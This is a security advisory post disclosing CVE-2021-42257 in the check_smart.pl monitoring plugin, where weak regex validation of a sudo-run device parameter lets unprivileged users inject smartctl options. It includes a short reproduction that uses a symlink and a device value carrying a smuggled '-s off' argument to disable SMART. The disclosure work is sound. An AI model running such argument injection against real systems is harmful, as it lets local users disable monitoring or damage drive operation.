---
layout: post
author: <a href='mailto:wfrisch@suse.de'>Wolfgang Frisch</a>
title:  "check_smart.pl: unprivileged user can alter hard drive settings (CVE-2021-42257)"
date:   2021-10-14
tags:   CVE local sudo
excerpt: "check_smart.pl from version 6.1 through 6.9 contained an insufficient input validation that allowed any unprivileged local user to modify SMART settings, disable SMART monitoring entirely, shut down a drive or degrade a drive's performance by disabling its read cache."
---

# Table of Contents
{:.no_toc}

* ToC
{:toc}

# Introduction
`check_smart.pl` [^1][^2] is a plugin to monitor to the values of SMART
attributes of hard and solid state drives, based on smartmontools. It is
intended for integration with systems monitoring software, e.g. Nagios, Icinga
1, Icinga 2, Shinken or Naemon.

During a routine audit of custom scripts in openSUSE, a vulnerability [^4] was
discovered: `check_smart.pl` [^1][^2] from version 6.1 through 6.9 contained an
insufficient input validation that allowed any unprivileged local user to
modify SMART settings, disable SMART monitoring entirely, shut down a drive or
degrade a drive's performance by disabling its read cache. The bug was fixed
with the release of version 6.9.1 [^3].

# Details
`check_smart.pl` needs to run as root in order to execute `smartctl`.
This is achieved with an entry in `/etc/sudoers`, which allows a lesser
privileged user, e.g. the one the monitoring system runs under, to
execute it. User input that is passed to `smartctl` is sufficiently
validated apart from one minor oversight.

The -d parameter is validated as follows:
```
if (-b $opt_dl || -c $opt_dl || $opt_dl =~ m/\/dev\/bus\/\d/) {
  # OK
} else {
  # NOT OK
}
```

Later on, this parameter is passed verbatim to smartctl:
```
my $full_command = "$smart_command -d $interface -Hi $device"
```

So an acceptable device name would be:

* a block special device
* a char special device
* or match the regex `/dev/bus/\d`

Critically, this regex matches even when `/dev/bus/\d` is just a _substring_ of
any arbitrary directory, for example `/tmp/dev/bus/1/sda`.

This can be exploited to pass arbitrary parameters to `smartctl`.

# Steps to reproduce
```
su -l -s /bin/bash nagios

mkdir -p /tmp/dev/bus/1/
ln -s /dev/sda /tmp/dev/bus/1/
ls -l /tmp/dev/bus/1/sda

/usr/lib/nagios/plugins/check_smart --debug -i auto -d "/tmp/dev/bus/1/sda -s off"
```

```
SMART Disabled.
```

# Upstream bugfix
Upstream (Claudio Kuenzler) was very responsive and quickly released
check_smart-6.9.1 [^3] to fix the issue.

# References

[^1]: [https://github.com/Napsty/check_smart](https://github.com/Napsty/check_smart)
[^2]: [https://www.claudiokuenzler.com/monitoring-plugins/check_smart.php](https://www.claudiokuenzler.com/monitoring-plugins/check_smart.php)
[^3]: [https://www.claudiokuenzler.com/blog/1068/check_smart-6.9.1-security-fix-release-pseudo-device-path](https://www.claudiokuenzler.com/blog/1068/check_smart-6.9.1-security-fix-release-pseudo-device-path)
[^4]: [https://bugzilla.suse.com/show_bug.cgi?id=1183057](https://www.claudiokuenzler.com/blog/1068/check_smart-6.9.1-security-fix-release-pseudo-device-path)
